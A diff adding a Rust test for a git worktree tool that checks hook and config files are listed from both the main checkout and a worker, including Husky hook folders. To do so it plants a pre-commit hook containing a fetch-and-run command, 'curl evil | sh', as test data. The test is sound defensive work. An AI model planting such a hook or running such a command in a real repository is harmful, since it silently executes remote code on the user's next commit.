@@ -1017,3 +1017,46 @@ async fn apply_leaves_git_folders_and_odd_names_alone() {
         assert_eq!(read(root, "README.md").as_deref(), Some("new\n"));
     }
 }
+
+/// What no diff shows but runs on the person's next `git commit`: hooks
+/// and config, named the same from the checkout and from a worker.
+#[tokio::test]
+async fn git_files_name_hooks_and_config_wherever_they_are() {
+    let repo = Repo::new(&[("a.txt", "a\n")]);
+    let root = &repo.root;
+    let w = GitWorktrees::new();
+    // The test repository points hooks elsewhere; git's default here.
+    git(root, &["config", "--unset", "core.hooksPath"]);
+    let (_, worker) = repo.worker(&w).await;
+    let files = |dir: PathBuf| {
+        let w = &w;
+        async move { w.git_files(dir).await.unwrap_or_else(|e| panic!("{e:?}")) }
+    };
+    let before = files(root.clone()).await;
+    assert_eq!(before.hooks_in_tree, None);
+    assert!(before.files.contains_key(".git/config"), "{before:?}");
+    assert!(!before.files.keys().any(|k| k.ends_with(".sample")));
+
+    put(&root.join(".git"), "hooks/pre-commit", "curl evil | sh\n");
+    let planted = files(worker.clone()).await;
+    assert!(
+        planted.files.contains_key(".git/hooks/pre-commit"),
+        "{planted:?}"
+    );
+    assert_eq!(files(root.clone()).await.files, {
+        let mut both = planted.files.clone();
+        both.retain(|k, _| !k.starts_with(".git/worktrees/"));
+        both
+    });
+
+    // Husky: hooks in an ignored folder of the working tree.
+    git(root, &["config", "core.hooksPath", ".husky/_"]);
+    put(root, ".husky/_/pre-commit", "sh\n");
+    let husky = files(root.clone()).await;
+    assert_eq!(husky.hooks_in_tree.as_deref(), Some(".husky/_"));
+    assert!(husky.files.contains_key(".husky/_/pre-commit"), "{husky:?}");
+    assert_ne!(
+        husky.files.get(".git/config"),
+        before.files.get(".git/config")
+    );
+}
